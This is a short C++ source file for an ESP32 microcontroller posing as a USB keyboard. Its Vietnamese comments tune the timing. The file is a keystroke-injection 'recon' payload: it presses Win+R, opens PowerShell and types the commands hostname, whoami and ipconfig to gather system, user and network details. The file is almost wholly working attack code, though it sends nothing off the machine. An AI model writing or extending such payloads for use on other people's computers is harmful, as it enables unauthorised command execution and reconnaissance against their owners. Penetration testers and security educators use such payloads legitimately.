#include "recon.h"
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <esp32-hal.h>

extern USBHIDKeyboard Keyboard;

void runRecon() {

    Serial.println("Payload starting in 3 seconds...");
    delay(3000); // Đợi 3 giây sau khi nhấn nút, cho Windows kịp phản ứng

    Keyboard.releaseAll(); 
    delay(200); // Đợi hệ thống phản hồi việc nhả phím 

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(120);
    Keyboard.releaseAll();

    delay(1500);

    Keyboard.println("powershell");

    delay(3000); // đợi PowerShell mở

    Keyboard.write(KEY_RETURN);  // đảm bảo focus
    delay(200);

    Keyboard.println("hostname; whoami; ipconfig"); 

    Keyboard.releaseAll();

}